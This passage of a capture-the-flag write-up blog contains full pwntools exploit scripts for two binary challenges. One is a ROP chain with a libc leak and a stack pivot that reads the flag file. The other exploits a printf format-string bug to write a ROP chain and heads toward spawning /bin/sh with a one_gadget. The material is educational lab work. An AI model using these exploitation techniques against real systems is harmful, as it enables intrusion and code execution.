+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_rop</span>(ropchain):
+</span></span><span style=display:flex><span>    buff_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x16</span>
+</span></span><span style=display:flex><span>    payload  <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span> <span style=color:#f92672>*</span> buff_len
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;B&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>+=</span> ropchain
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> payload
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    io, libc, flag <span style=color:#f92672>=</span> conn()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># good luck pwning :)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------- gadgets --------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    pop_rsp <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x000000000040139d</span> <span style=color:#75715e># pop rsp; pop r13; pop r14; pop r15; ret;</span>
+</span></span><span style=display:flex><span>    pop_rdi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000004013a3</span> <span style=color:#75715e># pop rdi; ret;</span>
+</span></span><span style=display:flex><span>    pop_rsi <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000004013a1</span> <span style=color:#75715e># pop rsi; pop r15; ret;</span>
+</span></span><span style=display:flex><span>    pop_rdx <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00000000004011de</span> <span style=color:#75715e># pop rdx; ret;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    pwn_dis_shit_ptr <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x00402004</span> <span style=color:#75715e># &#39;pwn dis shit&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ------------------- leaking libc ------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    rop <span style=color:#f92672>=</span> ROP(exe)
+</span></span><span style=display:flex><span>    leak_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;read&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Note: we MUST leak libc because we do NOT have any &#39;syscall&#39; instruction!</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We can use the bss segment to read/write another ropchain.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We need to write another ropchain because we do not know, </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># at the time of sending this rop, the base of libc.</span>
+</span></span><span style=display:flex><span>    other_ropchain_addr <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>bss(<span style=color:#ae81ff>100</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Leak reading with puts the GOT of a function</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>puts(exe<span style=color:#f92672>.</span>got[leak_func])
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>puts(pwn_dis_shit_ptr) <span style=color:#75715e># used as a marker to send the second ropchain</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the second ropchain into memory at the specified address</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, other_ropchain_addr, <span style=color:#ae81ff>0x1000</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># PIVOT the stack into the second ropchain</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We are popping the RSP register, effectively moving our stack</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># to the specified popped address. The program will keep executing</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># normally, but the stack will be at our chosen position</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(pop_rsp)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(other_ropchain_addr)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Just a little debugging trick for ropchains</span>
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#39;# ================ ROP 1 ================= #&#39;</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(rop<span style=color:#f92672>.</span>dump())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send the payload</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> create_rop(rop<span style=color:#f92672>.</span>chain())
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#39;pwn dis shit&#39;</span>, payload)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Get the libc leak. We again use https://libc.blukat.me </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># to find the correct libc version used on the server</span>
+</span></span><span style=display:flex><span>    libc_leak <span style=color:#f92672>=</span> u64(io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#ae81ff>1</span>:]<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>leak_func<span style=color:#e6db74>}</span><span style=color:#e6db74> @ </span><span style=color:#e6db74>{</span>hex(libc_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[leak_func]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base @ </span><span style=color:#e6db74>{</span>hex(libc<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Some useful gadgets from libc</span>
+</span></span><span style=display:flex><span>    mov_ptrrdx_eax <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000374b1</span> <span style=color:#75715e># mov dword ptr [rdx], eax; ret;</span>
+</span></span><span style=display:flex><span>    syscall_ret <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x0000000000066229</span> <span style=color:#75715e># syscall; ret;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># -------------- open(&#39;/pwn/flag.txt&#39;) --------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ------------- read(flagfd, mem, len) --------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ------------- write(stdout, mem, len) -------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    rop <span style=color:#f92672>=</span> ROP(exe)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    strings_addr <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>bss(<span style=color:#ae81ff>400</span>) <span style=color:#75715e># a place far enough from our ropchain</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># 3 POPs to adjust previous stack pivoting</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The pop_rsp gadget was also popping other 3 registers!  </span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Read the &#39;/pwn/flag.txt&#39; string from stdin</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>0</span>, strings_addr, len(flag))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Execute the open(&#39;/pwn/flag.txt&#39;) libc function (this is why we needed libc btw)</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(pop_rdi)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(strings_addr)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(pop_rsi)
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0x000</span>) <span style=color:#75715e># O_RDONLY</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># pop_rsi pops 2 registers!</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>raw(libc<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;open&#39;</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The followings instructions were used to check if the file descriptor </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># from whom we were trying to read was correct. We also determined this by</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># debugging the exploit with gdb in an ubuntu 20.04 container (which was the</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># one used in the challenge, as the description reported).</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We determined that the correct fd was 5</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#  </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># rop.raw(pop_rdx)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># rop.raw(exe.bss(600))</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># rop.raw(mov_ptrrdx_eax)</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># rop.puts(exe.bss(600))</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Read into our address the flag...</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>read(<span style=color:#ae81ff>5</span>, strings_addr, <span style=color:#ae81ff>50</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ...and then print it out</span>
+</span></span><span style=display:flex><span>    rop<span style=color:#f92672>.</span>puts(exe<span style=color:#f92672>.</span>bss(<span style=color:#ae81ff>400</span>))
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#39;# ================ ROP 2 ================= #&#39;</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(rop<span style=color:#f92672>.</span>dump())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send second ropchain</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendlineafter(<span style=color:#e6db74>&#39;pwn dis shit&#39;</span>, rop<span style=color:#f92672>.</span>chain())
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send the flag filename (&#39;/pwn/flag.txt&#39; on the server)</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>send(flag)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Profit</span>
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>success(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Flag: </span><span style=color:#e6db74>{</span>io<span style=color:#f92672>.</span>recvall()<span style=color:#f92672>.</span>decode()<span style=color:#f92672>.</span>strip()<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    main()
+</span></span></code></pre></div><h3 id=the-flag-6>The Flag</h3><p>The flag was <code>UDCTF{R0PEN_RE@D_WR!T3_right??}</code></p><h3 id=conclusion-5>Conclusion</h3><p>Indeed a fun and instructive challenge. That&rsquo;s the first time I&rsquo;ve seen this <code>seccomp</code> stuff!</p><h2 id=formatt-zelinsky-461-points-1>ForMatt Zelinsky (461 points)</h2><h3 id=description-8>Description</h3><p>Right? What? Wear? Pants? Built on Ubuntu 20.04.</p><h3 id=gathering-information-8>Gathering information</h3><p>We can decompile the program with Ghidra. It extracts the following pseudo-c-code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(EVP_PKEY_CTX <span style=color:#f92672>*</span>param_1)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> buffer [<span style=color:#ae81ff>336</span>];
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  init(param_1);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Oh no!! Full RELRO, PIE enabled, and no obvious buffer overflow.:(&#34;</span>);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Thankfully, I</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>m generous and will grant you two leaks&#34;</span>);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;This stack leak might be useful %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,buffer);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;And this PIE leak might be useful %p</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,main);
+</span></span><span style=display:flex><span>  puts(<span style=color:#e6db74>&#34;Now gimme your payload&#34;</span>);
+</span></span><span style=display:flex><span>  fgets(buffer,<span style=color:#ae81ff>0x150</span>,stdin);
+</span></span><span style=display:flex><span>  printf(<span style=color:#e6db74>&#34;Is this what you meant? &#34;</span>);
+</span></span><span style=display:flex><span>  printf(buffer);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>As 0x150 = 336, there is no buffer overflow. But there is indeed a format string vulnerability (<a href="https://www.youtube.com/watch?v=CyazDp-Kkr0">if you have no idea what this is, check this link</a>) as the program uses <code>printf</code> on our input buffer without any check.</p><h3 id=exploitation-8>Exploitation</h3><p>The idea is the following: we can use the format string vulnerability to write and execute a ropchain. Having this in mind, it&rsquo;s relatively simple to exploit the vulnerability.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>HOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;challenges.ctfd.io&#34;</span>
+</span></span><span style=display:flex><span>PORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>30042</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>exe <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#34;./formatz&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>binary <span style=color:#f92672>=</span> exe
+</span></span><span style=display:flex><span>context<span style=color:#f92672>.</span>log_level <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;debug&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>conn</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>LOCAL:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;/usr/lib/libc-2.33.so&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> process([exe<span style=color:#f92672>.</span>path])
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        libc <span style=color:#f92672>=</span> ELF(<span style=color:#e6db74>&#39;./libc6_2.31-0ubuntu9.2_amd64.so&#39;</span>, checksec<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> remote(HOST, PORT), libc
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exec_fmt</span>(payload):
+</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> process([exe<span style=color:#f92672>.</span>path])
+</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> p<span style=color:#f92672>.</span>recvall()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># good luck pwning :)</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Determine format string offset automatically (thx pwntools &lt;3)</span>
+</span></span><span style=display:flex><span>    autofmt <span style=color:#f92672>=</span> FmtStr(exec_fmt)
+</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> autofmt<span style=color:#f92672>.</span>offset
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;Format string offset: </span><span style=color:#e6db74>{</span>offset<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    io, libc <span style=color:#f92672>=</span> conn()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    buff_len <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x150</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ------------------- leaking libc ------------------ #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Recieve the leaks</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;This stack leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    stack_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;stack @ </span><span style=color:#e6db74>{</span>hex(stack_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;And this PIE leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    main_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> main_leak <span style=color:#f92672>-</span> exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;base address @ </span><span style=color:#e6db74>{</span>hex(exe<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The offset to RIP is calculated as following</span>
+</span></span><span style=display:flex><span>    rip <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> buff_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> <span style=color:#75715e># 8 = RBP length!</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We make use of this useful gadget</span>
+</span></span><span style=display:flex><span>    pop_rdi <span style=color:#f92672>=</span> exe<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x00000000000012bb</span> <span style=color:#75715e># pop rdi; ret;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># We now use the format string vulnerability to write and execute a ropchain</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Overwrite EIP with whatever we want and use it to leak LIBC.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># In order to leak libc we execute puts with a function&#39;s GOT entry address as an argument.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># This way puts will print out, as a string, the address of the function inside libc.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># </span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Notice that, after leaking LIBC base address, we return to main.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># This is done to make it simple to execute another ropchain from a clear environment!</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Note: we use the function provided by pwntools because:</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#    - I&#39;m lazy</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>#    - It would be a hell of calculations to do this by hand</span>
+</span></span><span style=display:flex><span>    leak_func <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;setvbuf&#39;</span>
+</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> fmtstr_payload(offset, {rip: pop_rdi, rip<span style=color:#f92672>+</span><span style=color:#ae81ff>8</span>: exe<span style=color:#f92672>.</span>got[leak_func], rip<span style=color:#f92672>+</span><span style=color:#ae81ff>16</span>: exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;puts&#39;</span>], rip<span style=color:#f92672>+</span><span style=color:#ae81ff>24</span>: exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]}, write_size<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;short&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Send payload...</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>sendline(payload)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ...and recieve the leak</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    libc_leak <span style=color:#f92672>=</span> u64(io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x7f</span><span style=color:#e6db74>&#39;</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>leak_func<span style=color:#e6db74>}</span><span style=color:#e6db74> @ </span><span style=color:#e6db74>{</span>hex(libc_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Set the base address of libc, based on the leak</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Notice that the correct libc version was determined by leaking different functions</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># and using the online libc database https://libc.blukat.me/</span>
+</span></span><span style=display:flex><span>    libc<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> libc_leak <span style=color:#f92672>-</span> libc<span style=color:#f92672>.</span>symbols[leak_func]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;libc base @ </span><span style=color:#e6db74>{</span>hex(libc<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># ---------------- execve(&#39;/bin/sh&#39;) ---------------- #</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># --------------------------------------------------- #</span>
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Same as above, get leaks</span>
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;This stack leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    stack_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;stack @ </span><span style=color:#e6db74>{</span>hex(stack_leak)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    io<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;And this PIE leak might be useful &#39;</span>)
+</span></span><span style=display:flex><span>    main_leak <span style=color:#f92672>=</span> int(io<span style=color:#f92672>.</span>recvline()[<span style=color:#ae81ff>2</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>], <span style=color:#ae81ff>16</span>)
+</span></span><span style=display:flex><span>    exe<span style=color:#f92672>.</span>address <span style=color:#f92672>=</span> main_leak <span style=color:#f92672>-</span> exe<span style=color:#f92672>.</span>symbols[<span style=color:#e6db74>&#39;main&#39;</span>]
+</span></span><span style=display:flex><span>    log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;base address @ </span><span style=color:#e6db74>{</span>hex(exe<span style=color:#f92672>.</span>address)<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Re-calculate rip address</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># The gadget positions stays the same (and we don&#39;t need it anyway)</span>
+</span></span><span style=display:flex><span>    rip <span style=color:#f92672>=</span> stack_leak <span style=color:#f92672>+</span> buff_len <span style=color:#f92672>+</span> <span style=color:#ae81ff>8</span> 
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Overwrite EIP with a onegadget that executes execve(&#39;/bin/sh&#39;, NULL, NULL) under some constraint.</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># A onegadget is basically a sequence of instructions in a certain libc that makes the execve(&#39;/bin/sh&#39;, NULL, NULL) syscall.</span>
